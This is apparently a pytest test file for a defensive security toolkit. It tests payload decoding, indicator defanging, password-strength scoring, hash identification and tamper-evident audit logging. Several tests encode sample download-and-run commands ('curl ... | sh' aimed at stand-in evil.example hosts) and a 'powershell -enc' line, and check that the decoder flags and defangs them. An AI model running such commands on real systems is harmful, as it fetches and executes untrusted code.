"""Tests for the offline tool logic — no network required."""

from __future__ import annotations

import base64
import json

import pytest

from cybersec_mcp import audit
from cybersec_mcp.tools.decode import decode_payload, try_base64, try_hex, try_rot13
from cybersec_mcp.tools.hashes import identify
from cybersec_mcp.tools.passwords import guessability, normalise, pool_entropy_bits
from cybersec_mcp.tools.triage import classify


# ── Decoder ───────────────────────────────────────────────────────────────

def test_base64_roundtrip() -> None:
    assert try_base64(base64.b64encode(b"hello world payload").decode()) == "hello world payload"


def test_base64_rejects_noise() -> None:
    """v1 accepted almost anything by appending '==' and skipping validation."""
    assert try_base64("not-valid-base64!!!") is None
    assert try_base64("abc") is None


def test_hex_decodes_and_rejects_odd_length() -> None:
    assert try_hex("48656c6c6f20776f726c64") == "Hello world"
    assert try_hex("48656c6c6f2") is None


def test_rot13_only_reported_when_it_helps() -> None:
    """v1 printed a ROT13 rendering of every input, including binary garbage."""
    assert try_rot13("uggc://rknzcyr.pbz/") is not None   # decodes to a URL
    assert try_rot13("Hello world") is None               # already plaintext


@pytest.mark.asyncio
async def test_nested_layers_are_peeled() -> None:
    inner = base64.b64encode(b"powershell -enc BASE64PAYLOAD").decode()
    outer = base64.b64encode(inner.encode()).decode()
    out = await decode_payload(outer)
    assert "2 layer" in out
    assert "PowerShell execution" in out


@pytest.mark.asyncio
async def test_decoded_iocs_are_defanged() -> None:
    payload = base64.b64encode(b"curl http://evil.example.com/x.sh | sh").decode()
    out = await decode_payload(payload)
    assert "http://evil.example.com" not in out
    assert "[.]" in out


@pytest.mark.asyncio
async def test_plaintext_reports_nothing_rather_than_noise() -> None:
    out = await decode_payload("hello world this is plain text")
    assert "No layer decoded" in out


# ── Passwords ─────────────────────────────────────────────────────────────

def test_leet_normalisation() -> None:
    assert normalise("P@ssw0rd") == "password"


def test_the_v1_regression_case() -> None:
    """v1 scored this 72 bits and called the entropy 'sufficient'. It is not."""
    verdict, reasons = guessability("P@ssw0rd123")
    assert verdict.startswith("🔴")
    assert reasons
    assert pool_entropy_bits("P@ssw0rd123") > 60  # the formula still says 'strong'


@pytest.mark.parametrize(
    "password",
    ["Summer2026!", "qwerty123", "Password1", "aaaaaaaaaaaa", "Company123!"],
)
def test_predictable_shapes_are_caught(password: str) -> None:
    verdict, _ = guessability(password)
    assert not verdict.startswith("🟢")


def test_a_long_random_string_is_not_flagged() -> None:
    verdict, _ = guessability("7xQ#mvR2!pLd9%wTz")
    assert verdict.startswith("🟢")


# ── Hash identification ───────────────────────────────────────────────────

@pytest.mark.parametrize(
    "value,expected",
    [
        ("44d88612fea8a8f36de82e1278abb02f", "MD5"),
        ("a" * 40, "SHA-1"),
        ("a" * 64, "SHA-256"),
    ],
)
def test_hash_identification(value: str, expected: str) -> None:
    ok, detected = identify(value)
    assert ok and detected == expected


# ── Indicator classification ──────────────────────────────────────────────

@pytest.mark.parametrize(
    "value,expected",
    [
        ("CVE-2021-44228", "cve"),
        ("44d88612fea8a8f36de82e1278abb02f", "hash"),
        ("https://example.com/x", "url"),
        ("8.8.8.8", "ip"),
        ("example.com", "domain"),
        ("¯\\_(ツ)_/¯", "unknown"),
    ],
)
def test_classify(value: str, expected: str) -> None:
    assert classify(value) == expected


# ── Audit chain ───────────────────────────────────────────────────────────

def test_audit_chain_detects_tampering(tmp_path, monkeypatch) -> None:
    path = tmp_path / "audit.jsonl"
    monkeypatch.setattr(audit.config, "AUDIT_PATH", path)
    monkeypatch.setattr(audit.config, "AUDIT_ENABLED", True)

    for i in range(3):
        audit.record("check_cve", {"cve_id": f"CVE-2021-4422{i}"}, outcome="ok", duration_ms=10)

    intact, summary = audit.verify_chain(path)
    assert intact, summary

    lines = path.read_text().splitlines()
    record = json.loads(lines[1])
    record["tool"] = "something_else"
    lines[1] = json.dumps(record)
    path.write_text("\n".join(lines) + "\n")

    intact, summary = audit.verify_chain(path)
    assert not intact
    assert "Line 2" in summary


def test_passwords_never_reach_the_audit_log(tmp_path, monkeypatch) -> None:
    path = tmp_path / "audit.jsonl"
    monkeypatch.setattr(audit.config, "AUDIT_PATH", path)
    monkeypatch.setattr(audit.config, "AUDIT_ENABLED", True)

    audit.record("password_strength", {"password": "hunter2-secret"}, outcome="ok", duration_ms=1)
    assert "hunter2-secret" not in path.read_text()
    assert "redacted" in path.read_text()


@pytest.mark.asyncio
async def test_embedded_blob_inside_a_command_is_decoded() -> None:
    """`powershell -enc <blob>` — the blob is an argument, not the whole payload."""
    inner = base64.b64encode(b"curl http://evil.example.net/p.sh | sh").decode()
    outer = base64.b64encode(f"powershell -enc {inner}".encode()).decode()
    out = await decode_payload(outer)
    assert "Embedded encoded blobs" in out
    assert "shell download-and-run" in out
    assert "evil[.]example[.]net" in out


@pytest.mark.asyncio
async def test_no_defang_footer_when_there_are_no_iocs() -> None:
    out = await decode_payload(base64.b64encode(b"just some plain text here").decode())
    assert "Re-fang only inside" not in out
